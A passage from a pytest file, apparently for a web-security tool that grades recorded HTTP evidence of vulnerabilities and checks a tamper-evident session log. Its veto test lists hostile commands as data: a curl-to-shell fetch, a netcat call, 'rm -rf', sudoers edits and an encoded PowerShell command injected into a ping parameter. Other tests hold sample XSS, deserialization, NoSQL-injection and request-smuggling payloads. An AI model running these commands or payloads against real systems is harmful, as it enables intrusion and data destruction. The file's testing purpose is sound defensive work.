    before = ex("d1", "http://t.local/settings", "email: old@x.test")
    refused = ex("d2", "http://t.local/settings/update", "CSRF token missing",
                 403, method="POST", req_body="email=new@evil.test",
                 req_headers={"host": "t.local", "origin": "http://evil.test"})
    after = ex("d3", "http://t.local/settings", "email: new@evil.test")
    assert proof.grade("csrf", "new@evil.test",
                       [before, refused, after]).grade == "unproven"
    w = ex("d4", "http://t.local/api/register", "forbidden", 403,
           method="POST", req_body='{"is_admin":true}')
    r = ex("d5", "http://t.local/api/user/9", '{"id":9,"is_admin":true}')
    assert proof.grade("massassign", '"is_admin":true', [w, r]).grade == "unproven"
    ok = ex("d6", "http://t.local/api/me", '{"role":"admin"}', 200,
            req_headers={"host": "t.local", "cookie": "s=good"})
    expired = ex("d7", "http://t.local/api/me", "session expired", 401,
                 req_headers={"host": "t.local", "cookie": "s=old"})
    assert proof.grade("jwt", '{"role":"admin"}', [ok, expired]).grade == "unproven"


def test_a_refusal_is_not_data():
    """`nosqli` graded `proven` on `{"error":"invalid operator"}` and
    `graphql` on a 404 carrying "introspection is disabled"."""
    refused = ex("f1", "http://t.local/api/login",
                 '{"error":"invalid operator"}', 200, method="POST",
                 req_body='{"user":{"$ne":null}}')
    assert proof.grade("nosqli", '{"error":"invalid operator"}',
                       [refused]).grade == "unproven"
    declined = ex("f2", "http://t.local/graphql",
                  '{"errors":[{"message":"introspection is disabled"}]}', 404,
                  method="POST", req_body='{"query":"{__schema{types{name}}}"}')
    assert proof.grade("graphql", "introspection is disabled",
                       [declined]).grade == "unproven"


def test_the_host_is_part_of_the_endpoint():
    """Two tenants of a multi-tenant app, each reading their own record,
    compared as one endpoint and graded as broken access control."""
    a = ex("g1", "http://alice.saas.test/api/user/1", '{"username":"alice"}')
    b = ex("g2", "http://bob.saas.test/api/user/2", '{"username":"bob"}')
    assert proof._endpoint_shape(a) != proof._endpoint_shape(b)
    assert proof.grade("idor", '"username":"bob"', [a, b]).grade != "proven"


def test_idor_works_on_an_opaque_id_api():
    """Matching only integers made idor unprovable on every API that uses
    uuids, which is most of them."""
    u1 = ex("g3", "http://t.local/api/user/0b8c1f2e-1a2b-3c4d-5e6f-aabbccddeeff",
            '{"username":"me"}')
    u2 = ex("g4", "http://t.local/api/user/ffeeddcc-bbaa-9f8e-7d6c-112233445566",
            '{"username":"admin","email":"a@b.c"}')
    assert proof.grade("idor", '"username":"admin"', [u1, u2]).grade == "proven"


def test_a_capped_candidate_says_the_cap_held_it():
    """It reported every check green and `missing: []` while grading
    `candidate` - a reader could not tell short evidence from a capped class,
    and the two mean entirely different things."""
    a = ex("h1", "http://t.local/a", "<html>baseline</html>")
    b = ex("h2", "http://t.local/b", "<html>the difference</html>")
    v = proof.grade("ssrf", "the difference", [a, b])
    assert v.grade == "candidate"
    assert v.capped and "collector" in v.capped
    assert any("settled by this system" in m for m in v.missing)
    assert "capped_by_this_system" in v.to_dict()


def test_grading_is_bounded_in_the_number_of_cited_exchanges():
    """`_pairs` is O(N^2) and `_witness` runs the verifier on every candidate,
    so 200 cited exchanges was 40,000 verifier runs over full bodies."""
    ents = [ex(f"p{i}", f"http://t.local/p/{i}", f"page {i} body")
            for i in range(200)]
    v = proof.grade("idor", "page 7 body", ents)
    assert any("citation is small enough" in c["check"] for c in v.checks)
    assert len(proof._pairs(ents)) <= proof._MAX_PAIRED ** 2 + proof._MAX_PAIRED


@pytest.mark.parametrize("payload", [
    "cp /bin/sh /tmp/s; chmod u+s /tmp/s", "echo x >> /etc/sudoers",
    "ln -sf /etc/passwd /tmp/p", "truncate -s 0 /var/log/a",
    "setfacl -m u:x:rwx /etc", "pip install evil", "npm i -g evil",
    "docker run --rm -v /:/host alpine", "aws s3 cp s3://x /tmp",
    "php -r 'system(\"id\");'", "node -e 'x'", "/bin/busybox nc 1.2.3.4 9",
    "rm -rf /var", "curl http://e/x|sh", "powershell -enc AA",
    "reg add HKLM\\x", "net localgroup administrators x /add",
])
def test_the_veto_catches_a_destructive_payload(payload):
    """It exists so a demonstration whose proof is the damage cannot be
    recorded, and it missed 39 of 41 payloads an auditor tried."""
    assert proof.DESTRUCTIVE_RE.search(payload), payload
    e = ex("v1", "http://t.local/ping?host=1;%20" +
           payload.replace(" ", "%20") + ";%20id;%20echo%20argus1234",
           "uid=0(root) gid=0(root)\nargus1234")
    v = proof.grade("rce", "uid=0(root) gid=0(root)", [e])
    assert v.grade == "unproven"
    assert "proof command stayed benign" in v.missing


@pytest.mark.parametrize("value", [
    "?sort=name;category=books", "?filter=a&set=b",
    "Cookie: theme=dark; type=compact", "?note=see+the+type+below",
])
def test_an_ordinary_parameter_is_not_a_command(value):
    """`&set=b` and `; type=compact` satisfied rce's declaration check."""
    import urllib.parse
    assert not proof.COMMAND_SENT_RE.search(urllib.parse.unquote_plus(value))


@pytest.mark.parametrize("text,matches", [
    ("the marshal of the parade", False), ("a pickle recipe", False),
    ("yaml.load is unsafe", False), ("constructor[0]", False),
    ('!!python/object/apply:os.system ["id"]', True),
    ('O:8:"Evil":1:{', True), ("rO0ABXNy", True),
])
def test_serialized_payloads_are_not_english(text, matches):
    assert bool(proof.SERIALIZED_RE.search(text)) is matches, text


@pytest.mark.parametrize("html", ['<div role="navigation">', "<li role=menuitem>"])
def test_the_aria_role_attribute_is_not_a_subject_field(html):
    """`role=` matched every ARIA attribute, re-opening the pagination bypass
    on any HTML page."""
    assert not proof.SUBJECT_RE.search(html)
    assert not proof.PRIVILEGED_FIELD_RE.search(html)


def test_no_module_defines_a_function_twice():
    """A block rewrite left two `verify_generic` definitions in proof.py, the
    second silently shadowing the first. Nothing caught it: both happened to
    behave the same, and the next pair might not."""
    import ast
    import pathlib
    root = pathlib.Path(proof.__file__).resolve().parent
    offenders = {}
    for path in sorted(root.rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        names = [n.name for n in tree.body
                 if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef,
                                   ast.ClassDef))]
        dups = sorted({n for n in names if names.count(n) > 1})
        if dups:
            offenders[path.name] = dups
    assert not offenders, f"shadowed top-level definitions: {offenders}"


def test_lockout_is_the_absence_of_a_difference():
    """It was graded by `_discriminates`, which asks for a difference - and
    this bug is characterised by not having one. The real bug graded
    `unproven` while the defence working graded `candidate`, and the
    `candidate` cap made the inversion look like a limit."""
    # a real login body: `u=a&p=b` was not recognised as an authentication
    # attempt at all once the check started requiring a credential field,
    # which is the point - five page views are not five login attempts
    series = [ex(f"L{i}", "http://t.local/login", "Invalid credentials", 401,
                 method="POST", req_body="username=a&password=b")
              for i in range(6)]
    assert proof.grade("lockout", "Invalid credentials",
                       series).grade == "proven"
    throttled = series[:5] + [
        ex("L9", "http://t.local/login", "Too many attempts", 429,
           method="POST", req_body="username=a&password=b")]
    v = proof.grade("lockout", "Invalid credentials", throttled)
    assert v.grade == "candidate"
    assert "none of them was refused" in v.missing
    # two attempts is not a counted series
    assert proof.grade("lockout", "Invalid credentials",
                       series[:2]).grade == "unproven"
    assert proof.spec_for("lockout").ceiling == ""


def test_a_dangerous_scheme_in_location_is_off_origin():
    """`javascript:` has no host, so returning "" read it as in-origin and a
    redirect to `javascript:alert(1)` - which the lab plants and
    probe_redirect detects - graded `unproven`."""
    assert proof._redirect_host("javascript:alert(1)") == "javascript:"
    assert proof._redirect_host("data:text/html,x") == "data:"
    assert proof._redirect_host("/home") == ""
    js = ex("J1", "http://t.local/go?next=javascript:alert(1)", "", 302,
            headers={"location": "javascript:alert(1)"})
    home = ex("J2", "http://t.local/go?next=/home", "", 302,
              headers={"location": "/home"})
    assert proof.grade("redirect", "", [js, home]).grade == "proven"


def test_a_grade_stripped_with_its_proof_block_is_still_detected(tmp_path):
    """Deleting `grade` AND `proof` together looked exactly like a session
    recorded before grading existed. If any row in the file carries a grade,
    a row without one had it removed."""
    from argus.session import findings_overgraded
    s = _sess(tmp_path)
    rid = s.record_exchange("p", {"method": "GET", "url": "http://t.local/i"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    a = s.add_finding("a", "high", "sqli", "http://t.local/i?id=1", [rid],
                      "sqlite3.OperationalError", "d", "r")
    b = s.add_finding("b", "low", "disclosure", "http://t.local/e", [rid],
                      "sqlite3.OperationalError", "d", "r")
    stripped = {k: v for k, v in a.items() if k not in ("grade", "proof")}
    rows = findings_overgraded({rid: s.get_exchange(rid)}, [stripped, b])
    assert rows and rows[0]["claimed"] == "(removed)"
    # a file with no grades anywhere is a legacy session, not a tampered one
    legacy = [{k: v for k, v in r.items() if k not in ("grade", "proof")}
              for r in (a, b)]
    assert findings_overgraded({rid: s.get_exchange(rid)}, legacy) == []


def test_sarif_never_defaults_an_unknown_grade_to_a_build_break():
    import inspect
    from argus.report import sarif
    src = inspect.getsource(sarif.render_sarif)
    assert '_KIND.get(grade, "review")' in src


# --- what the chain does and does not prove ---------------------------------

def test_an_unkeyed_chain_does_not_resist_forgery(tmp_path):
    """The honest property. sha256(prev + entry) is computable by anyone, so a
    self-consistent session can be built from nothing - the chain proves the
    file was not edited after the run, which is what tamper-EVIDENT means and
    all it means."""
    from argus.session import verify_transcript
    s = Session(tmp_path, "http://t.local", meta={})
    s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                      {"status": 200, "headers": {}, "body": "invented"})
    res = verify_transcript(s.dir)
    assert res["chained"] and not res["bad_lines"]


def test_a_keyed_chain_resists_it(tmp_path):
    """With a key the link is HMAC-SHA256, so only a holder of the key can
    produce a chain that verifies: the difference between "this file was not
    edited" and "this run happened"."""
    from argus.session import verify_transcript
    key = "engagement-key-2026"
    s = Session(tmp_path, "http://t.local", meta={"chain_keyed": True},
                seal_key=key)
    s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                      {"status": 200, "headers": {}, "body": "real"})
    assert not verify_transcript(s.dir, key)["bad_lines"]
    # without the key, verify says so instead of calling every line tampered
    unkeyed = verify_transcript(s.dir)
    assert unkeyed["key_required"] is True
    assert verify_transcript(s.dir, "wrong")["bad_lines"] == [1]


def test_the_seal_key_is_never_written_to_an_artifact(tmp_path):
    """An artifact carrying its own forging material would defeat the point."""
    import json
    key = "engagement-key-2026"
    s = Session(tmp_path, "http://t.local", meta={"chain_keyed": True},
                seal_key=key)
    s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                      {"status": 200, "headers": {}, "body": "real"})
    blob = "".join(p.read_text(encoding="utf-8", errors="replace")
                   for p in s.dir.iterdir())
    assert key not in blob
    meta = json.loads((s.dir / "meta.json").read_text(encoding="utf-8"))
    assert meta["chain_keyed"] is True and "seal_key" not in meta


def test_enum_needs_two_answers_each_seen_twice():
    """`_discriminates` asked only that two responses differ, which is true of
    any two pages - so the class was capped with "one difference is not a
    counted series" as the reason. The series is in the transcript."""
    def login(rid, body, status):
        return ex(rid, "http://t.local/login", body, status, method="POST",
                  req_body="u=x&p=y")
    real = [login("E1", "No such user", 404), login("E2", "No such user", 404),
            login("E3", "Wrong password", 401), login("E4", "Wrong password", 401)]
    assert proof.grade("enum", "Wrong password", real).grade == "proven"
    once = [login("E5", "No such user", 404),
            login("E6", "Wrong password", 401)]
    v = proof.grade("enum", "Wrong password", once)
    assert v.grade == "candidate"
    assert "each answer was observed more than once" in v.missing
    same = [login(f"E{7+i}", "Invalid credentials", 401) for i in range(4)]
    assert proof.grade("enum", "Invalid credentials", same).grade == "unproven"
    assert proof.spec_for("enum").ceiling == ""


def test_a_confirmation_page_is_not_a_stored_upload():
    """`verify_served_upload` required the nonce back and an active
    content-type, and both are true of an "Upload complete - saved <your
    svg>" page. Served as text/html it graded `proven` against an app that
    stored nothing. The response has to BE the file."""
    boundary = "----argusupl1"
    svg = ('<svg xmlns="http://www.w3.org/2000/svg">'
           "<script>/*argusupl1234*/alert(1)</script></svg>")
    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
            f'filename="x.svg"\r\nContent-Type: image/svg+xml\r\n\r\n'
            f"{svg}\r\n--{boundary}--\r\n")
    upload = {"id": "u1",
              "request": {"method": "POST", "url": "http://t.local/upload",
                          "headers": {}, "body": body},
              "response": {"status": 200, "headers": {},
                           "body": '{"url":"/files/x.svg"}'}}

    def fetch(rid, path, served, ctype, status=200, disposition=None):
        headers = {"content-type": ctype}
        if disposition:
            headers["content-disposition"] = disposition
        return {"id": rid,
                "request": {"method": "GET", "url": "http://t.local" + path,
                            "headers": {}, "body": None},
                "response": {"status": status, "headers": headers,
                             "body": served}}

    stored = fetch("u2", "/files/x.svg", svg, "image/svg+xml")
    assert proof.grade("upload", svg[:50], [upload, stored]).grade == "proven"

    page = ("<html><body><h1>Upload complete</h1><p>Saved " + svg + "</p>"
            + "<div>chrome</div>" * 40 + "</body></html>")
    verdict = proof.grade("upload", svg[:50],
                          [upload, fetch("u3", "/done", page, "text/html")])
    assert verdict.grade != "proven", verdict.explain()
    assert "it is served back with the bytes intact" in verdict.missing

    # the same bytes served inert, and served as a download, are both fine
    for ctype, disposition in (("text/plain", None),
                               ("image/svg+xml", "attachment; filename=x.svg")):
        assert proof.grade("upload", svg[:50], [
            upload, fetch("u4", "/files/x.svg", svg, ctype, 200,
                          disposition)]).grade != "proven"

    # accepted but never served, and a 404 on the fetch
    assert proof.grade("upload", '{"url":"/files/x.svg"}',
                       [upload]).grade != "proven"
    assert proof.grade("upload", svg[:50], [
        upload, fetch("u5", "/files/x.svg", svg, "image/svg+xml",
                      404)]).grade != "proven"


def test_the_capped_set_is_exactly_what_the_docs_claim():
    """The residuals section states counts. A count in a document that the
    code can contradict is the defect the doc gate exists to catch, and the
    gate cannot read prose - so the claim is asserted here instead."""
    capped = {s.vuln_class for s in proof.MATRIX.values() if s.ceiling}
    refused = {s.vuln_class for s in proof.MATRIX.values()
               if s.verifier is proof.verify_refused}
    assert capped == {"xss", "ssrf"}, capped
    assert refused == {"dos"}, refused
    # `verify_generic` is `_discriminates` alone, which is what "no verifier
    # written yet" looks like. ssrf shares it for a different reason: the
    # evidence it would need is an out-of-band hit this package cannot see,
    # so writing a verifier would not help.
    assert {"ssrf"} == {
        s.vuln_class for s in proof.MATRIX.values()
        if s.verifier is proof.verify_generic}
    assert proof.spec_for("xss").verifier is not proof.verify_generic, \
        "xss has a real verifier; its cap is the missing browser"
    # and the five that came off the list keep real verifiers
    for name in ("lockout", "enum", "crlf", "upload", "method", "race",
                 "websocket", "smuggle"):
        spec = proof.spec_for(name)
        assert spec.ceiling == "", f"{name} is capped again"
        assert spec.verifier not in (proof.verify_generic,
                                     proof.verify_refused), name


def test_every_cap_states_its_reason_and_every_reason_has_a_cap():
    """`cap_reason` exists because the reason lived in prose in two documents
    and drifted from the matrix twice while classes came off the list. A
    ceiling with no reason is undocumented; a reason with no ceiling is a
    leftover from a class that was freed."""
    for spec in {s.vuln_class: s for s in proof.MATRIX.values()}.values():
        assert bool(spec.ceiling) == bool(spec.cap_reason), (
            f"{spec.vuln_class}: ceiling={spec.ceiling!r} "
            f"cap_reason={spec.cap_reason!r}")


def test_the_unimplemented_caps_are_exactly_the_generic_verifier_ones():
    """A cap marked `unimplemented` means the transcript already holds what a
    verifier would need. That is the same thing as still being on
    `verify_generic` - except ssrf, which is on it for a reason labour cannot
    fix and is therefore NOT marked unimplemented."""
    specs = {s.vuln_class: s for s in proof.MATRIX.values()}.values()
    unimplemented = {s.vuln_class for s in specs
                     if s.cap_reason == proof.CAP_UNIMPLEMENTED}
    assert unimplemented == set(), (
        f"{sorted(unimplemented)} capped for want of a verifier - the list is "
        "empty now, so a new entry needs its own positive test and a doc line")
    generic = {s.vuln_class for s in specs
               if s.verifier is proof.verify_generic}
    assert unimplemented <= generic
    assert generic - unimplemented == {"ssrf"}
    assert proof.spec_for("ssrf").cap_reason != proof.CAP_UNIMPLEMENTED


def test_a_capped_class_says_so_when_printed():
    """An operator reading `argus proof <class>` has to learn that `proven`
    is unreachable before spending an engagement trying to reach it."""
    import io
    import contextlib
    from argus.cli import main
    for klass, expect in (("xss", "no browser ships"),
                          ("ssrf", "out-of-band collector"),
                          ("dos", "REFUSED")):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            main(["proof", klass])
        out = buf.getvalue()
        assert "CAPPED AT 'candidate'" in out or "REFUSED" in out, klass
        assert expect in out, f"{klass}: {out[-300:]}"
    # and an uncapped class says neither
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        main(["proof", "rce"])
    assert "CAPPED" not in buf.getvalue()
    assert "REFUSED" not in buf.getvalue()


def test_a_write_proves_nothing_when_only_its_url_carried_the_nonce():
    """Found by re-reading `verify_method_effect` after writing it.

    The read-back compared against `req_text`, which includes the URL. So a
    `PUT` of inert bytes to `/up/<nonce>.txt` plus a directory listing that
    echoes the filename graded `proven`: the effect proven was the server
    printing a path back, not storing anything. The nonce has to come from
    the request BODY, because that is what "the bytes it wrote" means.
    """
    inert = ex("m1", "http://t.local/up/argusputab12.txt", "", 201,
               method="PUT", req_body="inert bytes")
    listing = ex("m2", "http://t.local/up/argusputab12.txt",
                 "<a href=argusputab12.txt>argusputab12.txt</a>")
    verdict = proof.grade("method", "argusputab12.txt", [inert, listing])
    assert verdict.grade != "proven", verdict.explain()
    assert "the method had an observable effect" in verdict.missing

    # a write with no body at all cannot be read back
    empty = ex("m3", "http://t.local/up/argusputab12.txt", "", 201,
               method="PUT")
    assert proof.grade("method", "argusputab12",
                       [empty, listing]).grade != "proven"

    # and the real thing still passes
    opts = ex("m0", "http://t.local/up/x.txt", "", 200, method="OPTIONS",
              headers={"allow": "GET, HEAD, POST"})
    real = ex("m4", "http://t.local/up/x.txt", "", 201, method="PUT",
              req_body="argus method probe argusputab12")
    read = ex("m5", "http://t.local/up/x.txt",
              "argus method probe argusputab12")
    assert proof.grade("method", "argus method probe argusputab12",
                       [opts, real, read]).grade == "proven"


def test_a_crlf_control_must_be_the_same_endpoint():
    """Found by re-reading `verify_header_injection` after writing it.

    "A control response does not carry it" was true of any exchange that
    happened not to carry the header - including one to a different host
    entirely, which says nothing about whether THIS endpoint always sends it.
    This is the same defect as `_endpoint_shape` dropping the host, which an
    earlier audit found making two SaaS tenants one endpoint.
    """
    inject = ex("c1", "http://t.local/redirect?next=%2Fh%0d%0a"
                "X-Argus-Probe%3A%20argusab12cd", "",
                headers={"x-argus-probe": "argusab12cd"})
    for rid, url in (("c2", "http://other.example/x"),
                     ("c3", "http://t.local/elsewhere")):
        control = ex(rid, url, "", headers={"server": "nginx"})
        verdict = proof.grade("crlf", "x-argus-probe: argusab12cd",
                              [inject, control])
        assert verdict.grade != "proven", f"{url}: {verdict.explain()}"
        assert "a control response does not carry it" in verdict.missing

    same = ex("c4", "http://t.local/redirect?next=%2Fhome", "",
              headers={"server": "nginx"})
    assert proof.grade("crlf", "x-argus-probe: argusab12cd",
                       [inject, same]).grade == "proven"


def _ws_handshake(rid, url, origin, key="KcNOB35svW/4TfvzJHyc2w==",
                  accept=None, status=101):
    import base64
    import hashlib
    if accept is None:
        accept = base64.b64encode(hashlib.sha1(
            (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()
        ).digest()).decode()
    headers = {"host": "t.local", "Upgrade": "websocket",
               "Connection": "Upgrade", "Sec-WebSocket-Key": key,
               "Sec-WebSocket-Version": "13"}
    if origin:
        headers["Origin"] = origin
    return {"id": rid,
            "request": {"method": "GET", "url": url, "headers": headers,
                        "body": None},
            "response": {"status": status,
                         "headers": {"Upgrade": "websocket",
                                     "Sec-WebSocket-Accept": accept},
                         "body": ""}}


def _ws_frame(rid, url, sent, got):
    return {"id": rid,
            "request": {"method": "WSFRAME", "url": url, "headers": {},
                        "body": sent},
            "response": {"status": 101, "headers": {}, "body": got}}


def test_websocket_is_proven_by_a_cross_origin_channel_that_answers():
    """`websocket` came off the CANNOT_BE_PROVEN_HERE list.

    Its note read "needs a real WebSocket client. This system compares the
    handshake only" - which was a missing client, not a missing proof.
    `GuardedClient.send_ws` frames now, so both halves are recordable.
    """
    url = "http://t.local/ws"
    shake = _ws_handshake("w1", url, "https://argus-probe.invalid")
    frame = _ws_frame("w2", url, "arguswsab12 argus-probe",
                      "echo: arguswsab12 argus-probe")
    assert proof.grade("websocket", "echo: arguswsab12 argus-probe",
                       [shake, frame]).grade == "proven"


def test_a_websocket_handshake_alone_is_not_a_hijackable_channel():
    url = "http://t.local/ws"
    shake = _ws_handshake("w3", url, "https://argus-probe.invalid")
    verdict = proof.grade("websocket", "101 Switching Protocols", [shake])
    assert verdict.grade != "proven"
    assert "the channel answered a message" in verdict.missing


def test_a_same_origin_websocket_is_the_endpoint_working():
    url = "http://t.local/ws"
    shake = _ws_handshake("w4", url, "http://t.local")
    frame = _ws_frame("w5", url, "arguswsab12 x", "echo: arguswsab12 x")
    verdict = proof.grade("websocket", "echo: arguswsab12 x", [shake, frame])
    assert verdict.grade != "proven"
    assert "accepted from an origin the target does not own" in verdict.missing


def test_a_101_without_the_rfc_challenge_is_not_a_websocket_endpoint():
    url = "http://t.local/ws"
    fake = _ws_handshake("w6", url, "https://argus-probe.invalid",
                         accept="not-the-right-token")
    frame = _ws_frame("w7", url, "arguswsab12 x", "echo: arguswsab12 x")
    verdict = proof.grade("websocket", "echo: arguswsab12 x", [fake, frame])
    assert verdict.grade != "proven"
    assert "the handshake completed the RFC 6455 challenge" in verdict.missing


def test_a_websocket_answer_must_carry_a_nonce_the_frame_sent():
    url = "http://t.local/ws"
    shake = _ws_handshake("w8", url, "https://argus-probe.invalid")
    # the channel said something, but nothing tying it to our frame
    frame = _ws_frame("w9", url, "hello", "welcome to the chat")
    verdict = proof.grade("websocket", "welcome to the chat", [shake, frame])
    assert verdict.grade != "proven"
    assert "the channel answered a message" in verdict.missing


def test_a_websocket_frame_on_another_endpoint_does_not_count():
    shake = _ws_handshake("wa", "http://t.local/ws",
                          "https://argus-probe.invalid")
    frame = _ws_frame("wb", "http://t.local/other-ws",
                      "arguswsab12 x", "echo: arguswsab12 x")
    verdict = proof.grade("websocket", "echo: arguswsab12 x", [shake, frame])
    assert verdict.grade != "proven"


def test_a_refused_upgrade_proves_nothing():
    shake = _ws_handshake("wc", "http://t.local/ws-strict",
                          "https://argus-probe.invalid", status=403)
    assert proof.grade("websocket", "origin not allowed",
                       [shake]).grade != "proven"


def _ambiguous(rid, url, body, status=200, method="POST"):
    """A request declaring BOTH framings, as send_raw records it."""
    text = (f"{method} /x HTTP/1.1\r\nHost: t.local\r\n"
            "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n")
    return {"id": rid,
            "request": {"method": method, "url": url,
                        "headers": {"Content-Length": "6",
                                    "Transfer-Encoding": "chunked"},
                        "request_text": text, "body": "0\r\n\r\nG"},
            "response": {"status": status, "headers": {}, "body": body}}


def _followup(rid, url, body, status=501, method="GET"):
    return {"id": rid,
            "request": {"method": method, "url": url, "headers": {},
                        "request_text": f"{method} /x HTTP/1.1", "body": None},
            "response": {"status": status, "headers": {}, "body": body}}


def test_smuggle_is_proven_by_a_bogus_method_named_back():
    """`smuggle` came off the CANNOT_BE_PROVEN_HERE list - the last one that
    was capped for want of a verifier.

    The note said this system "sends the desync pair and reads the
    difference, which is a candidate". The difference was never the
    evidence: `send_raw` keeps the wire text, so the ambiguous framing is
    visible, and it keeps unsolicited responses, so a response nothing asked
    for is visible too.
    """
    url = "http://t.local/x"
    # CL.TE: our own next request line was poisoned
    clte = [_ambiguous("s1", url, "ok"),
            _followup("s2", url, "Unsupported method ('GGET')")]
    assert proof.grade("smuggle", "Unsupported method ('GGET')",
                       clte).grade == "proven"

    # TE.CL: the response arrived with no request of its own (method "-")
    tecl = [_ambiguous("s3", url, "ok"),
            _followup("s4", url, "Unsupported method ('GPOST')",
                      method="-")]
    verdict = proof.grade("smuggle", "Unsupported method ('GPOST')", tecl)
    assert verdict.grade == "proven", verdict.explain()
    assert "with no request of its own" in " ".join(
        str(c.get("detail", "")) for c in verdict.checks)


def test_an_ambiguous_request_a_server_merely_dislikes_is_not_a_desync():
    url = "http://t.local/x"
    # a 400 that names no method is a server refusing an ambiguous request,
    # which is what it should do
    polite = [_ambiguous("s5", url, "ok"),
              _followup("s6", url, "Bad Request", status=400)]
    verdict = proof.grade("smuggle", "Bad Request", polite)
    assert verdict.grade != "proven"
    assert "the connection's framing was desynchronised" in verdict.missing


def test_a_bogus_method_without_the_ambiguity_proves_nothing():
    url = "http://t.local/x"
    plain = {"id": "s7",
             "request": {"method": "GET", "url": url, "headers": {},
                         "request_text": "GET /x HTTP/1.1", "body": None},
             "response": {"status": 501, "headers": {},
                          "body": "Unsupported method ('GGET')"}}
    verdict = proof.grade("smuggle", "Unsupported method ('GGET')", [plain])
    assert verdict.grade != "proven"
    assert "the request declared two conflicting framings" in verdict.missing


def test_a_desync_response_before_the_ambiguity_is_not_its_effect():
    url = "http://t.local/x"
    before = _followup("s8", url, "Unsupported method ('GGET')")
    after = _ambiguous("s9", url, "ok")
    assert proof.grade("smuggle", "Unsupported method ('GGET')",
                       [before, after]).grade != "proven"


def test_a_desync_on_another_endpoint_does_not_count():
    amb = _ambiguous("sa", "http://t.local/x", "ok")
    other = _followup("sb", "http://t.local/elsewhere",
                      "Unsupported method ('GGET')")
    assert proof.grade("smuggle", "Unsupported method ('GGET')",
                       [amb, other]).grade != "proven"


def test_no_verifier_raises_on_an_id_it_cannot_parse():
    """A verifier that raises is reported as "evidence is readable" failing,
    which hides whatever the real answer was.

    `verify_desync` ordered exchanges by parsing `r<n>` out of the id and
    called `min()` on the empty result when no id matched - so a claim it
    should have refused for a substantive reason came back as unreadable
    instead. The ids belong to the recorder; a verifier reasons about
    position and content.
    """
    odd = [
        {"id": "weird-id-1",
         "request": {"method": "POST", "url": "http://t.local/x",
                     "headers": {"Content-Length": "6",
                                 "Transfer-Encoding": "chunked"},
                     "request_text": "POST /x HTTP/1.1\r\n"
                                     "Content-Length: 6\r\n"
                                     "Transfer-Encoding: chunked\r\n\r\n",
                     "body": "0\r\n\r\nG"},
         "response": {"status": 200, "headers": {"content-type": "text/html"},
                      "body": "<html>hello</html>", "elapsed_ms": 5.0}},
        {"id": 42,
         "request": {"method": "GET", "url": "http://t.local/y",
                     "headers": {}, "body": None},
         "response": {"status": 200, "headers": {}, "body": "ok",
                      "elapsed_ms": 5.0}},
        {"id": None,
         "request": {"method": "-", "url": "http://t.local/x",
                     "headers": {}, "body": None},
         "response": {"status": 501, "headers": {}, "body": "nope",
                      "elapsed_ms": 5.0}},
    ]
    for name in proof.classes():
        verdict = proof.grade(name, "<html>hello</html>", odd)
        unreadable = [c for c in verdict.checks
                      if c["check"] == "evidence is readable" and not c["ok"]]
        assert not unreadable, (
            f"{name} raised instead of refusing: "
            f"{unreadable[0].get('detail')}")


def test_a_public_json_api_is_not_nosqli_however_it_is_probed():
    """Found by an adversarial audit of this session's own code.

    "Documents came back" is satisfied by any JSON API answering normally:
    `/api/posts` returns `[{"_id": ...}]` whether or not the `$ne` in the
    query changed anything. So a PUBLIC listing graded `proven` the moment
    somebody probed it. The operator has to have changed the answer, and that
    needs a control to the same endpoint without it.
    """
    rows = '[{"_id":"6512ab9f3c1d4e0012ab34cd","title":"public post"}]'
    probed = ex("p1", 'http://t.local/api/posts?f={"$ne":null}', rows)
    assert proof.grade("nosqli", rows[:50], [probed]).grade != "proven"

    # a control that answers identically says the documents are what this
    # endpoint returns anyway
    control = ex("p2", "http://t.local/api/posts", rows)
    verdict = proof.grade("nosqli", rows[:50], [probed, control])
    assert verdict.grade != "proven", verdict.explain()
    assert "the operator changed what the store answered" in verdict.missing

    # a control on a DIFFERENT endpoint is not a control for this one
    elsewhere = ex("p3", "http://t.local/api/other", '{"ok":true}')
    assert proof.grade("nosqli", rows[:50],
                       [probed, elsewhere]).grade != "proven"


def test_a_rest_api_that_honours_put_is_not_verb_tampering():
    """Found by an adversarial audit of this session's own code.

    `verify_method_effect` checked that a write was answered and that its
    bytes came back, and never that the endpoint SHOULD have refused it. So
    `PUT /api/note/7` returning 200, plus a `GET` of the same resource,
    graded `proven` - which is every correctly working REST API.
    """
    put = ex("v1", "http://t.local/api/note/7", "", 200, method="PUT",
             req_body="argusput1234 hello")
    get = ex("v2", "http://t.local/api/note/7", "argusput1234 hello")
    verdict = proof.grade("method", "argusput1234 hello", [put, get])
    assert verdict.grade != "proven", verdict.explain()
    assert "a method the endpoint should refuse was honoured" in verdict.missing

    # an Allow list that omits the method makes it a finding
    opts = ex("v3", "http://t.local/api/note/7", "", 200, method="OPTIONS",
              headers={"allow": "GET, HEAD"})
    assert proof.grade("method", "argusput1234 hello",
                       [opts, put, get]).grade == "proven"

    # so does the same method refused elsewhere on the SAME host
    refused = ex("v4", "http://t.local/api/other", "no", 405, method="PUT")
    assert proof.grade("method", "argusput1234 hello",
                       [refused, put, get]).grade == "proven"

    # but not on a different host - that says nothing about this one
    far = ex("v5", "http://other.example/api/x", "no", 405, method="PUT")
    assert proof.grade("method", "argusput1234 hello",
                       [far, put, get]).grade != "proven"

    # TRACE needs no such evidence: no application needs it reachable
    trace = {"id": "v6",
             "request": {"method": "TRACE", "url": "http://t.local/",
                         "headers": {"x-argus-trace": "argustrzz99"},
                         "body": None},
             "response": {"status": 200, "headers": {},
                          "body": "TRACE / HTTP/1.1\nX-Argus-Trace: argustrzz99"}}
    assert proof.grade("method", "X-Argus-Trace: argustrzz99",
                       [trace]).grade == "proven"


# --- what the adversarial audit of this session's own code found ------------
#
# Nine lenses read the code written in this session and the dominant finding
# was the one two earlier audits had already found twice: a check that passes
# without the claimant doing anything class-specific. Five classes graded
# `proven` on evidence containing no vulnerability. Each case below is the
# demonstration from that audit, reproduced before the fix and asserted after.

def test_three_read_only_gets_and_a_404_are_not_a_race():
